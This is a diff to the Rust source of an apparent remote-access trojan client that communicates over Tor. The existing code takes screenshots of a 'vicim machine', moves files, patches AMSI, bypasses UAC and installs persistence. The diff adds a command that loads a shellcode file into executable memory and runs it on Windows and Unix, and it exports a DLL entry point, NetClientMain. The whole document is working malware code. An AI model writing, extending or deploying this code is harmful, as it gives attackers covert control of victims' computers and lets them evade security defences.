@@ -28,18 +28,7 @@ use std::path::{Path};
 use base64::{engine::general_purpose, Engine as _};
 use libc::{c_int};
 
-#[cfg(target_os = "windows")]
 use screenshots::{Screen};
-#[cfg(target_os = "macos")]
-use screenshots::{Screen};
-#[cfg(target_os = "linux")]
-use screenshots::{Screen};
-
-#[cfg(target_os = "windows")]
-use screenshots::image::ImageOutputFormat;
-#[cfg(target_os = "macos")]
-use screenshots::image::ImageOutputFormat;
-#[cfg(target_os = "linux")]
 use screenshots::image::ImageOutputFormat;
 
 
@@ -48,6 +37,15 @@ use screenshots::image::ImageOutputFormat;
 
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
+
+#[cfg(target_os = "windows")]
+use winapi::um::memoryapi::VirtualAlloc;
+#[cfg(target_os = "windows")]
+use winapi::um::processthreadsapi::CreateThread;
+#[cfg(target_os = "windows")]
+use winapi::um::handleapi::CloseHandle;
+#[cfg(target_os = "windows")]
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
 
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
@@ -82,7 +80,7 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     Ok(client)
 }
 
-#[cfg(not(target_os = "android"))]
+//#[cfg(not(target_os = "android"))]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
@@ -103,44 +101,6 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
     Ok(format!("{}",b64))
 }
 
-#[cfg(target_os = "android")]
-pub fn take_screenshot_base64() -> anyhow::Result<String> {
-    use anyhow::{anyhow, Result};
-    use base64::{engine::general_purpose, Engine as _};
-    use std::fs;
-    use std::path::Path;
-    use std::process::Command;
-
-    // Temporary screenshot path
-    let screenshot_path = "/data/local/tmp/screenshot.png";
-
-    // Run Android screencap utility
-    let output = Command::new("/system/bin/screencap")
-        .arg("-p")
-        .arg(screenshot_path)
-        .output()?;
-
-    // Ensure screencap succeeded
-    if !output.status.success() {
-        return Err(anyhow!(
-            "screencap failed: {}",
-            String::from_utf8_lossy(&output.stderr)
-        ));
-    }
-
-    let path = Path::new(screenshot_path);
-
-    // Read PNG bytes
-    let png_bytes = fs::read(path)?;
-
-    // Remove temporary screenshot file
-    fs::remove_file(path)?;
-
-    // Encode PNG bytes as base64
-    let encoded = general_purpose::STANDARD.encode(&png_bytes);
-
-    Ok(encoded)
-}
 
 /// Build prompt string
 pub fn build_prompt() -> String {
@@ -159,6 +119,67 @@ pub fn build_prompt() -> String {
     format!("{}@{} [{}] >> ", user, host, cwd)
 }
 
+#[cfg(target_os = "windows")]
+fn execute_shellcode_windows(data: &[u8]) -> Result<()> {
+    unsafe {
+        let ptr = VirtualAlloc(
+            std::ptr::null_mut(),
+            data.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+        if ptr.is_null() {
+            return Err(anyhow!("VirtualAlloc failed"));
+        }
+        std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());
+
+        let thread = CreateThread(
+            std::ptr::null_mut(),
+            0,
+            Some(std::mem::transmute(ptr)),
+            std::ptr::null_mut(),
+            0,
+            std::ptr::null_mut(),
+        );
+        if thread.is_null() {
+            return Err(anyhow!("CreateThread failed"));
+        }
+        CloseHandle(thread);
+    }
+    Ok(())
+}
+
+#[cfg(not(target_os = "windows"))]
+fn execute_shellcode_unix(data: &[u8]) -> Result<()> {
+    let data = data.to_vec();
+    std::thread::spawn(move || {
+        unsafe {
+            let pagesize = libc::sysconf(libc::_SC_PAGESIZE) as usize;
+            let aligned_size = (data.len() + pagesize - 1) & !(pagesize - 1);
+
+            let ptr = libc::mmap(
+                std::ptr::null_mut(),
+                aligned_size,
+                libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
+                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
+                -1,
+                0,
+            );
+
+            if ptr == libc::MAP_FAILED {
+                return;
+            }
+
+            std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());
+
+            let func: extern "C" fn() = std::mem::transmute(ptr);
+            func();
+
+            libc::munmap(ptr, aligned_size);
+        }
+    });
+    Ok(())
+}
 
 /// Execute a command
 pub async fn run_command(input: &str) -> Result<Vec<u8>> {
@@ -176,6 +197,7 @@ Available commands:
     `screenshot`=>\tTake screenshot from vicim machine
     `upload [filename]`=>\tUpload file to the server
     `download [filename]`=>\tDownload file from the server
+    `shellcode [file]`=>\tExecute shellcode from file
     `uac [exe_path]`=>\tRun elevated command on Windows
 
     ").into_bytes())
@@ -262,6 +284,24 @@ Available commands:
             {
                 Ok(b"uac not supported on this OS\n".to_vec())
             }
+        }
+
+        "shellcode" => {
+            let filename = args
+                .get(0)
+                .ok_or_else(|| anyhow!("shellcode: missing filename"))?;
+
+            let data = fs::read(filename)?;
+
+            let msg = format!("Executing shellcode from {} ({} bytes)\n", filename, data.len());
+
+            #[cfg(target_os = "windows")]
+            execute_shellcode_windows(&data)?;
+
+            #[cfg(not(target_os = "windows"))]
+            execute_shellcode_unix(&data)?;
+
+            Ok(msg.into_bytes())
         }
 
         "exit" | "quit" | "/quit" => {
@@ -408,8 +448,7 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
 #[cfg(target_os = "windows")]
 const IS_DLL:bool = true;
 
-//#[unsafe(export_name = "netclient")]
-pub async fn netclient()->  c_int {
+async fn netclient_impl() -> c_int {
     #[cfg(target_os = "windows")]
     amsi_patch::amsi_patch();
 
@@ -418,7 +457,6 @@ pub async fn netclient()->  c_int {
         Ok(p) => p,
         Err(_) => return 1,
     };
-
 
     #[cfg(target_os = "windows")]
     let exe_str = exe_path.to_string_lossy().to_string();
@@ -430,7 +468,7 @@ pub async fn netclient()->  c_int {
         }
         uac_bypass::elevate_uac(&exe_str);
         return 1;
-    } 
+    }
     #[cfg(target_os = "windows")]
     persist::persist(IS_DLL);
     #[cfg(target_os = "windows")]
@@ -439,4 +477,14 @@ pub async fn netclient()->  c_int {
     }
     let _ = netclient_run(ClientConfig::default()).await;
     return 0;
+}
+
+pub async fn netclient() -> c_int {
+    netclient_impl().await
+}
+
+#[no_mangle]
+pub extern "C" fn NetClientMain() -> c_int {
+    let rt = tokio::runtime::Runtime::new().unwrap();
+    rt.block_on(netclient_impl())
 }
